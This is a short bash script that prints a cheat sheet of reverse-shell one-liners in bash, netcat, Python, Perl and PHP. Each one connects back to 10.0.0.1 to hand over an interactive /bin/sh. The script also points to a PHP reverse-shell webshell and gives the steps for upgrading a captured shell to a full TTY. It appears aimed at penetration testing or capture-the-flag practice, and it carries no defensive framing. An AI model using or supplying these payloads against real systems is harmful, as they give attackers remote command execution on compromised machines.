#!/bin/bash

# Adjust the "=" strings length based on n cols
s=$(printf "%-$(tput cols)s" "=")
LINE=$(echo "${s// /=}")


# COLORS
BGRED="\e[41m"
END="\e[0m"
BLINK="\e[5m"

# Compilation of common one-liner revshells
echo -e "\n=*= Common Reverse Shells one liner =*=\n"
# BASH
echo -e "\n${BGRED}${BLINK}BASH${END}"
echo "$LINE"
echo "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"

# NETCAT
echo -e "\n${BGRED}${BLINK}NETCAT${END}"
echo "$LINE"
echo "nc -e /bin/sh 10.0.0.1 1234"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"

# PYTHON
echo -e "\n${BGRED}${BLINK}PYTHON${END}"
echo "$LINE"
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"

# PERL
echo -e "\n${BGRED}${BLINK}PERL${END}"
echo "$LINE"
echo "perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"


# PHP
echo -e "\n${BGRED}${BLINK}PHP${END}"
echo "$LINE"
echo "php -r '\$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
echo ""

# Compilation of reverse shells
echo -e "\n=*= Common Reverse Shells =*=\n"
# PHP Revershell PHP
echo -e "\n${BGRED}${BLINK}PHP-REVERSE-SHELL${END}"
echo "$LINE"
echo "cp /usr/share/webshells/php/php-reverse-shell.php ."

echo ""
# Stablize Shell
echo -e "\n=*= Stablize Reverse Shell =*=\n"
echo -e "\n${BGRED}${BLINK}Fully interactive TTY shell${END}"
echo "$LINE"
echo "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
echo "/usr/bin/script -qc /bin/bash /dev/null"
echo -e "\nCtrl Z"
echo "stty raw -echo; fg"
echo -e "\nexport TERM=xterm"
echo "export TERM=xterm-256color"
echo -e "\nstty row 52 cols 211"
echo ""

